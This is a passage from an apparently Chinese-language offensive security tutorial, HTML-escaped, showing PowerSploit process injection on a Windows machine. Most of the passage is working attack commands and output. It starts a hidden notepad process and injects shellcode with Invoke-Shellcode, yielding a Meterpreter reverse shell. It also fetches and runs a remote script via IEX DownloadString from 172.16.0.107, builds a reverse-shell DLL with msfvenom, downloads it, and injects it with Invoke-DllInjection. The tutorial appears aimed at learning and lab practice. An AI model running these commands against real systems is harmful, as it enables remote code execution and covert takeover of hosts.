&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ¥ç€è¾“å…¥Get-Processå‘½ä»¤æˆ–è€…pså‘½ä»¤æŸ¥çœ‹å½“å‰è¿›ç¨‹:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;get-process&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Handles&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;NPM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;K&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;PM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;K&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;      &lt;span class=&#34;n&#34;&gt;WS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;K&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;CPU&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;Id&lt;/span&gt;  &lt;span class=&#34;nb&#34;&gt;SI &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ProcessName&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;-------&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;------&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;-----&lt;/span&gt;      &lt;span class=&#34;p&#34;&gt;-----&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;------&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;--&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;--&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-----------&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;mf&#34;&gt;190&lt;/span&gt;      &lt;span class=&#34;mf&#34;&gt;12&lt;/span&gt;     &lt;span class=&#34;mf&#34;&gt;2840&lt;/span&gt;      &lt;span class=&#34;mf&#34;&gt;10288&lt;/span&gt;       &lt;span class=&#34;mf&#34;&gt;0.03&lt;/span&gt;   &lt;span class=&#34;mf&#34;&gt;2696&lt;/span&gt;   &lt;span class=&#34;mf&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;msdtc&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;mf&#34;&gt;434&lt;/span&gt;      &lt;span class=&#34;mf&#34;&gt;59&lt;/span&gt;   &lt;span class=&#34;mf&#34;&gt;100276&lt;/span&gt;      &lt;span class=&#34;mf&#34;&gt;82620&lt;/span&gt;       &lt;span class=&#34;mf&#34;&gt;6.84&lt;/span&gt;   &lt;span class=&#34;mf&#34;&gt;2004&lt;/span&gt;   &lt;span class=&#34;mf&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MsMpEng&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;mf&#34;&gt;730&lt;/span&gt;      &lt;span class=&#34;mf&#34;&gt;39&lt;/span&gt;    &lt;span class=&#34;mf&#34;&gt;61676&lt;/span&gt;      &lt;span class=&#34;mf&#34;&gt;75816&lt;/span&gt;       &lt;span class=&#34;mf&#34;&gt;2.19&lt;/span&gt;   &lt;span class=&#34;mf&#34;&gt;2016&lt;/span&gt;   &lt;span class=&#34;mf&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åè¾“å…¥ä»¥ä¸‹å‘½ä»¤åˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹ï¼Œå¹¶æŠŠå®ƒè®¾ç½®ä¸ºéšè—çª—å£æ‰§è¡Œï¼Œå†æŸ¥çœ‹notepadçš„è¿›ç¨‹idä¸º3048ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;start-process&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;System32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;notepad&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-WindowStyle&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Hidden&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;get-process&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;notepad&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Handles&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;NPM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;K&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;PM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;K&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;      &lt;span class=&#34;n&#34;&gt;WS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;K&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;CPU&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;Id&lt;/span&gt;  &lt;span class=&#34;nb&#34;&gt;SI &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ProcessName&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;-------&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;------&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;-----&lt;/span&gt;      &lt;span class=&#34;p&#34;&gt;-----&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;------&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;--&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;--&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-----------&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;mf&#34;&gt;164&lt;/span&gt;      &lt;span class=&#34;mf&#34;&gt;11&lt;/span&gt;     &lt;span class=&#34;mf&#34;&gt;2328&lt;/span&gt;      &lt;span class=&#34;mf&#34;&gt;10920&lt;/span&gt;       &lt;span class=&#34;mf&#34;&gt;0.03&lt;/span&gt;   &lt;span class=&#34;mf&#34;&gt;3048&lt;/span&gt;   &lt;span class=&#34;mf&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;notepad&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ¥ç€è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œä½¿ç”¨Invoke-Shellcodeè„šæœ¬è¿›è¡Œè¿›ç¨‹æ³¨å…¥ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Invoke-Shellcode&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ProcessID&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;3048&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Shellcode&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Force&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;è®°å¾—æå‰åœ¨msfè®¾ç½®ç›‘å¬æ¨¡å¼&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°msfå·²ç»åå¼¹shellå›æ¥äº†ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 exploit(multi/handler) &amp;gt; run
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[*] Started HTTPS reverse handler on https://172.16.0.107:4444
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[!] https://172.16.0.107:4444 handling request from 172.16.0.106; (UUID: 4cj9oxgk) Without a database connected that payload UUID tracking will not work!
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[*] https://172.16.0.107:4444 handling request from 172.16.0.106; (UUID: 4cj9oxgk) Staging x64 payload (201308 bytes) ...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[!] https://172.16.0.107:4444 handling request from 172.16.0.106; (UUID: 4cj9oxgk) Without a database connected that payload UUID tracking will not work!
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[*] Meterpreter session 2 opened (172.16.0.107:4444 -&amp;gt; 127.0.0.1 ) at 2022-01-17 18:13:43 +0800
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;meterpreter &amp;gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬å¯ä»¥çœ‹åˆ°powershellçš„çª—å£å’Œè¿›ç¨‹å…³é—­åä¹Ÿä¸ä¼šå½±å“æˆ‘ä»¬çš„shellä¸­æ–­ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;meterpreter &amp;gt; ps
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Process List
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;============
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; PID   PPID  Name                      Arch  Session  User                           Path
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; ---   ----  ----                      ----  -------  ----                           ----
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 0     0     [System Process]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 4     0     System                    x64   0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 3048  2016  notepad.exe               x64   1        WIN-I1OIAEUTNT1\Administrator  C:\Windows\System32\notepad.exe
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;invoke-dllinjection&#34;&gt;Invoke-DllInjection&lt;/h3&gt;
&lt;p&gt;ä¸‹é¢ä½¿ç”¨CodeExecutionæ¨¡å—ä¸‹çš„å¦ä¸€ä¸ªè„šæœ¬Invoke-DllInjectionï¼Œå®ƒæ˜¯ä¸€ä¸ªDLLæ³¨å…¥çš„è„šæœ¬ã€‚&lt;/p&gt;
&lt;p&gt;åŒç†è¿˜æ˜¯é¦–å…ˆåœ¨MSFé‡Œé…ç½®å¥½ç›‘å¬ï¼Œç„¶ååœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;IEX &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Net&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WebClient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;DownloadString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://172.16.0.107:8000/CodeExecution/Invoke-DllInjection.ps1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åœ¨kaliä¸­ç”Ÿæˆä¸€ä¸ªdllçš„åå¼¹æœ¨é©¬ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”Œâ”€â”€&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kaliã‰¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/tools/windows/PowerSploit&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€$ msfvenom -p windows/x64/meterpreter/reverse_https &lt;span class=&#34;nv&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;172.16.0.107 &lt;span class=&#34;nv&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt; -f dll -o /home/kali/tools/windows/PowerSploit/test.dll  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; No platform was selected, choosing Msf::ModulE:&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;Platform::Windows from the payload
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; No arch selected, selecting arch: x64 from the payload
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;No encoder specified, outputting raw payload
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Payload sizE:&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;802&lt;/span&gt; bytes
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Final size of dll filE:&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;8704&lt;/span&gt; bytes
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Saved as: /home/kali/tools/windows/PowerSploit/test.dll
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å°†&lt;code&gt;test.dll&lt;/code&gt;ä¸‹è½½åˆ°ç›®æ ‡æœºå™¨ä¸Šï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;wget &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://172.16.0.107:8000/test.dll&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-outfile&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;test.dll&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ¥ç€å¯åŠ¨ä¸€ä¸ªnotepadçš„æ–°è¿›ç¨‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;start-process&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;System32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;notepad&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-WindowStyle&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Hidden&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;get-process&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;notepad&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Handles&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;NPM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;K&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;PM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;K&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;      &lt;span class=&#34;n&#34;&gt;WS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;K&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;CPU&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;Id&lt;/span&gt;  &lt;span class=&#34;nb&#34;&gt;SI &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ProcessName&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;-------&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;------&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;-----&lt;/span&gt;      &lt;span class=&#34;p&#34;&gt;-----&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;------&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;--&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;--&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-----------&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     &lt;span class=&#34;mf&#34;&gt;164&lt;/span&gt;      &lt;span class=&#34;mf&#34;&gt;11&lt;/span&gt;     &lt;span class=&#34;mf&#34;&gt;2496&lt;/span&gt;      &lt;span class=&#34;mf&#34;&gt;11004&lt;/span&gt;       &lt;span class=&#34;mf&#34;&gt;0.02&lt;/span&gt;   &lt;span class=&#34;mf&#34;&gt;4828&lt;/span&gt;   &lt;span class=&#34;mf&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;notepad&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä½¿ç”¨Invoke-Shellcodeè„šæœ¬è¿›è¡Œè¿›ç¨‹æ³¨å…¥ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Invoke-DllInjection&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ProcessID&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;4828&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Dll&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Administrator&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;dll&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;n&#34;&gt;Size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;K&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ModuleName&lt;/span&gt;                                         &lt;span class=&#34;n&#34;&gt;FileName&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;p&#34;&gt;-------&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;----------&lt;/span&gt;                                         &lt;span class=&#34;p&#34;&gt;--------&lt;/span&gt;
